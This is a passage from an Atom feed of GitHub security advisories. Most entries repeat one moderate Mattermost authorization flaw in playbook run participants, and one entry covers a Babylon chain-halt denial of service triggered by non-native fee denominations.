        <category label="severity" term="MODERATE"/>
        <published>2025-06-30T18:31:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</id>
        <link href="https://github.com/advisories/GHSA-v8fr-vxmw-6mf6"/>
        <updated>2025-06-30T20:40:34.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.5, 9.11.x &lt;= 9.11.15, 10.8.x &lt;= 10.8.0, 10.7.x &lt;= 10.7.2, 10.6.x &lt;= 10.6.5 fail to properly enforce channel member management permissions when adding participants to playbook runs. This allows authenticated users with member-level permissions to bypass system admin restrictions and add or remove users to/from private channels via the playbook run participants feature, even when the 'Manage Members' permission has been explicitly removed. This can lead to unauthorized access to sensitive channel content and allow guest users to gain channel management privileges.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46702">https://nvd.nist.gov/vuln/detail/CVE-2025-46702</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/mattermost/mattermost/commit/31142f101e3cce6171e2b6cb4980a1aa8eaefae0">https://github.com/mattermost/mattermost/commit/31142f101e3cce6171e2b6cb4980a1aa8eaefae0</a></li>
<li><a href="https://github.com/mattermost/mattermost/commit/4ae5d647fb8893d77dccbb57d114855939a775ce">https://github.com/mattermost/mattermost/commit/4ae5d647fb8893d77dccbb57d114855939a775ce</a></li>
<li><a href="https://github.com/advisories/GHSA-v8fr-vxmw-6mf6">https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-30T18:31:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</id>
        <link href="https://github.com/advisories/GHSA-v8fr-vxmw-6mf6"/>
        <updated>2025-06-30T20:40:34.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.5, 9.11.x &lt;= 9.11.15, 10.8.x &lt;= 10.8.0, 10.7.x &lt;= 10.7.2, 10.6.x &lt;= 10.6.5 fail to properly enforce channel member management permissions when adding participants to playbook runs. This allows authenticated users with member-level permissions to bypass system admin restrictions and add or remove users to/from private channels via the playbook run participants feature, even when the 'Manage Members' permission has been explicitly removed. This can lead to unauthorized access to sensitive channel content and allow guest users to gain channel management privileges.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46702">https://nvd.nist.gov/vuln/detail/CVE-2025-46702</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/mattermost/mattermost/commit/31142f101e3cce6171e2b6cb4980a1aa8eaefae0">https://github.com/mattermost/mattermost/commit/31142f101e3cce6171e2b6cb4980a1aa8eaefae0</a></li>
<li><a href="https://github.com/mattermost/mattermost/commit/4ae5d647fb8893d77dccbb57d114855939a775ce">https://github.com/mattermost/mattermost/commit/4ae5d647fb8893d77dccbb57d114855939a775ce</a></li>
<li><a href="https://github.com/advisories/GHSA-v8fr-vxmw-6mf6">https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-30T18:31:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</id>
        <link href="https://github.com/advisories/GHSA-v8fr-vxmw-6mf6"/>
        <updated>2025-06-30T20:40:34.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.5, 9.11.x &lt;= 9.11.15, 10.8.x &lt;= 10.8.0, 10.7.x &lt;= 10.7.2, 10.6.x &lt;= 10.6.5 fail to properly enforce channel member management permissions when adding participants to playbook runs. This allows authenticated users with member-level permissions to bypass system admin restrictions and add or remove users to/from private channels via the playbook run participants feature, even when the 'Manage Members' permission has been explicitly removed. This can lead to unauthorized access to sensitive channel content and allow guest users to gain channel management privileges.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46702">https://nvd.nist.gov/vuln/detail/CVE-2025-46702</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/mattermost/mattermost/commit/31142f101e3cce6171e2b6cb4980a1aa8eaefae0">https://github.com/mattermost/mattermost/commit/31142f101e3cce6171e2b6cb4980a1aa8eaefae0</a></li>
<li><a href="https://github.com/mattermost/mattermost/commit/4ae5d647fb8893d77dccbb57d114855939a775ce">https://github.com/mattermost/mattermost/commit/4ae5d647fb8893d77dccbb57d114855939a775ce</a></li>
<li><a href="https://github.com/advisories/GHSA-v8fr-vxmw-6mf6">https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-30T18:31:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</id>
        <link href="https://github.com/advisories/GHSA-v8fr-vxmw-6mf6"/>
        <updated>2025-06-30T20:40:34.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.5, 9.11.x &lt;= 9.11.15, 10.8.x &lt;= 10.8.0, 10.7.x &lt;= 10.7.2, 10.6.x &lt;= 10.6.5 fail to properly enforce channel member management permissions when adding participants to playbook runs. This allows authenticated users with member-level permissions to bypass system admin restrictions and add or remove users to/from private channels via the playbook run participants feature, even when the 'Manage Members' permission has been explicitly removed. This can lead to unauthorized access to sensitive channel content and allow guest users to gain channel management privileges.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46702">https://nvd.nist.gov/vuln/detail/CVE-2025-46702</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/mattermost/mattermost/commit/31142f101e3cce6171e2b6cb4980a1aa8eaefae0">https://github.com/mattermost/mattermost/commit/31142f101e3cce6171e2b6cb4980a1aa8eaefae0</a></li>
<li><a href="https://github.com/mattermost/mattermost/commit/4ae5d647fb8893d77dccbb57d114855939a775ce">https://github.com/mattermost/mattermost/commit/4ae5d647fb8893d77dccbb57d114855939a775ce</a></li>
<li><a href="https://github.com/advisories/GHSA-v8fr-vxmw-6mf6">https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-30T18:31:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</id>
        <link href="https://github.com/advisories/GHSA-v8fr-vxmw-6mf6"/>
        <updated>2025-06-30T20:40:34.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.5, 9.11.x &lt;= 9.11.15, 10.8.x &lt;= 10.8.0, 10.7.x &lt;= 10.7.2, 10.6.x &lt;= 10.6.5 fail to properly enforce channel member management permissions when adding participants to playbook runs. This allows authenticated users with member-level permissions to bypass system admin restrictions and add or remove users to/from private channels via the playbook run participants feature, even when the 'Manage Members' permission has been explicitly removed. This can lead to unauthorized access to sensitive channel content and allow guest users to gain channel management privileges.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46702">https://nvd.nist.gov/vuln/detail/CVE-2025-46702</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/mattermost/mattermost/commit/31142f101e3cce6171e2b6cb4980a1aa8eaefae0">https://github.com/mattermost/mattermost/commit/31142f101e3cce6171e2b6cb4980a1aa8eaefae0</a></li>
<li><a href="https://github.com/mattermost/mattermost/commit/4ae5d647fb8893d77dccbb57d114855939a775ce">https://github.com/mattermost/mattermost/commit/4ae5d647fb8893d77dccbb57d114855939a775ce</a></li>
<li><a href="https://github.com/advisories/GHSA-v8fr-vxmw-6mf6">https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-30T18:31:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/babylonlabs-io/babylon/v2] Babylon vulnerable to chain half when transaction has fees different than `ubbn`]]></title>
        <id>https://github.com/advisories/GHSA-56j4-446m-qrf6</id>
        <link href="https://github.com/advisories/GHSA-56j4-446m-qrf6"/>
        <updated>2025-06-30T17:54:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Sending transactions with fees different than native Babylon genesis denom (<code>ubbn</code>) leads to chain halt.</p>
<h3 id="impact">Impact</h3>
<p>Denial of Service - Due to panic in the <code>x/distribution</code> module <code>BeginBlocker</code> triggered by a error when sending fees  from <code>feeCollector</code> to <code>x/distribution</code> module - <a href="https://github.com/cosmos/cosmos-sdk/blob/main/x/distribution/keeper/allocation.go#L28">https://github.com/cosmos/cosmos-sdk/blob/main/x/distribution/keeper/allocation.go#L28</a> Babylon Genesis will halt</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/babylonlabs-io/babylon/security/advisories/GHSA-56j4-446m-qrf6">https://github.com/babylonlabs-io/babylon/security/advisories/GHSA-56j4-446m-qrf6</a></li>
<li><a href="https://github.com/babylonlabs-io/babylon/commit/fe67aebd5216e7d3afa1d7dee2a3f82e548556f3">https://github.com/babylonlabs-io/babylon/commit/fe67aebd5216e7d3afa1d7dee2a3f82e548556f3</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/blob/main/x/distribution/keeper/allocation.go#L28">https://github.com/cosmos/cosmos-sdk/blob/main/x/distribution/keeper/allocation.go#L28</a></li>
<li><a href="https://github.com/advisories/GHSA-56j4-446m-qrf6">https://github.com/advisories/GHSA-56j4-446m-qrf6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-56j4-446m-qrf6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-30T17:54:02.000Z</published>
    </entry>
</feed>